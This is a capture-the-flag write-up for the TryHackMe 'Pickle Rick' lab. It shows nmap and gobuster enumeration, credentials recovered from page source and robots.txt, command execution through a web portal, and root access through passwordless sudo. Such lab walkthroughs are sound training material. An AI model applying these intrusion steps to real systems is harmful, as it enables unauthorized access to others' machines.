# TryHackMe: Pickel Rick

https://tryhackme.com/room/picklerick

## 1. Network Enumeration

Use `nmap` to run a quick port scan to see what services are running on the box:

```
$ nmap 10.10.175.144   

Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-26 12:55 CET
Nmap scan report for 10.10.175.144
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 34.24 seconds
```

We see that this box is running the following services: SSH and HTTP. Let's take a look at the HTTP server.

## 2. Web Server

The home page of the web server tells us that we need to find three secret ingredients, but doesn't appear to show any other useful information. However, if we view source, we can see Rick's username: `R1ckRul3s`! We'll write that down for later, but for now lets start `gobuster` to see if we can find any hidden web pages.

```
$ gobuster -u http://<ip-address> -w /usr/share/wordlists/dirb/common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://<ip-address>/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2024/01/22 19:19:01 Starting gobuster
=====================================================
/.hta (Status: 403)
/.hta.html (Status: 403)
/.hta.txt (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/assets (Status: 301)
/denied.php (Status: 302)
/index.html (Status: 200)
/index.html (Status: 200)
/login.php (Status: 200)
/portal.php (Status: 302)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
=====================================================
2024/01/22 19:20:31 Finished
=====================================================
```

We do find a login page at `/login.php`, but we don't have a password. We could try brute forcing, but I'll look at the other files and directories first. `/robots.txt` contains a string, possibly a password: <redacted>. Let's try loging in at `/login.php` using the credentials we found.

## 3. File System Exploration

We were able to login, which brings us to `/portal.php`. This page seems to be a terminal that we can interact with. Let's try some basic commands:

```
$ whoami
www-data
$ ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Looks like we found our first secret ingredient! Use the `less` command to view it's contents. We also found the file `clue.txt`, which tells us to keep looking around the file system to find the other ingredients.

Let's check if there are any users who's home directory we have access to.

```
$ ls /home
rick
ubuntu
$ ls /home/rick
second ingredients
```

We found our second ingredient in a file called `second ingredients`! One to go!

## 4. Privilege Escalation

The last flag is most likely hidden in the `/root` directory, but we do not have access to it. We need to find a way to escalate our privileges. Let's check if we're allowed to use `sudo` on this machine:

```
$ sudo -l
Matching Defaults entries for www-data on ip-10-10-175-144.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-175-144.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

Oh. We can run anything as `root` and don't even need a passwordl. Let's check out the `root` directory then and find the final ingredient:

```
$ sudo ls /root
3rd.txt
snap
$ sudo less /root/3rd.txt
<redacted>
```